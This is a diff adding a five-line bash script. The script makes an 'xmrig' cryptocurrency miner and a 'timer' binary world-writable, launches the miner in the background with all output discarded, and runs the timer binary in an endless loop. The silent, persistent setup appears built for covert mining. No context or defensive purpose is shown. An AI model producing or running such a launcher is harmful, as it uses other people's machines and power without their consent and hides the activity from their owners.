@@ -1,0 +1,5 @@
+#!/bin/bash
+
+chmod 777 xmrig timer  >/dev/null 2>&1
+nohup ./xmrig --config=config.json >/dev/null 2>&1
+while :; do ./timer; sleep 2; done
